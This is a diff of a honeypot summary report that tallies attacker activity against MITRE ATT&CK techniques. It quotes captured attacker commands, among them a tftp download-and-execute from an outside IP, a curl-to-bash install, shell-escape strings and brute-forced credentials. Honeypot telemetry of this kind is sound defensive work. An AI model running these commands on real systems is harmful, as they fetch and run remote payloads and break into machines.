@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-29 08:04:10",
+  "generated": "2026-08-29 09:01:44",
   "totals": {
-    "commands": 257,
-    "login_failed": 456,
-    "login_success": 35,
-    "sessions": 610
+    "commands": 272,
+    "login_failed": 475,
+    "login_success": 39,
+    "sessions": 657
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 456,
+      "count": 475,
       "examples": [
         "ubuntu / Abdullah1234@",
         "root / Admin999",
@@ -21,8 +21,8 @@
         "admin / 1q2w3e4r5t"
       ],
       "first": "2026-08-29T00:01:28.806152Z",
-      "last": "2026-08-29T08:02:51.918740Z",
-      "unique_ips": 36
+      "last": "2026-08-29T09:00:51.944833Z",
+      "unique_ips": 37
     },
     {
       "id": "T1222.002",
@@ -44,7 +44,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 97,
+      "count": 99,
       "examples": [
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
@@ -53,14 +53,14 @@
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
       "first": "2026-08-29T00:23:05.332392Z",
-      "last": "2026-08-29T06:42:20.545488Z",
+      "last": "2026-08-29T08:33:42.249600Z",
       "unique_ips": 6
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 35,
+      "count": 39,
       "examples": [
         "root / 123@@@",
         "ubuntu / ubuntu",
@@ -69,8 +69,8 @@
         "admin / 12345"
       ],
       "first": "2026-08-29T00:22:29.262232Z",
-      "last": "2026-08-29T07:39:53.186149Z",
-      "unique_ips": 23
+      "last": "2026-08-29T08:59:32.978898Z",
+      "unique_ips": 24
     },
     {
       "id": "T1082",
@@ -137,31 +137,35 @@
   "unmapped": [
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      12
+      14
     ],
     [
       "system",
-      10
+      11
     ],
     [
       "shell",
-      10
+      11
     ],
     [
       "sh",
-      10
+      11
+    ],
+    [
+      "enable",
+      8
+    ],
+    [
+      "linuxshell",
+      8
     ],
     [
       "/bin/busybox",
       8
     ],
     [
-      "enable",
-      7
-    ],
-    [
-      "linuxshell",
-      7
+      "ping ;sh",
+      6
     ],
     [
       "RPMA",
@@ -172,32 +176,28 @@
       6
     ],
     [
-      "ping ;sh",
+      "enablelinuxshell",
       5
     ],
     [
-      "enablelinuxshell",
-      4
+      "cd /proc && cat self/cmdline",
+      5
     ],
     [
-      "cd /proc && cat self/cmdline",
-      4
+      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+      3
+    ],
+    [
+      "python3 /tmp/bendi.py",
+      3
+    ],
+    [
+      "rm /tmp/bendi.py",
+      3
     ],
     [
       "/bin/busybox UNSTABLE",
       3
-    ],
-    [
-      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-      2
-    ],
-    [
-      "python3 /tmp/bendi.py",
-      2
-    ],
-    [
-      "rm /tmp/bendi.py",
-      2
     ],
     [
       ">/tmp/.codi && cd /tmp/",
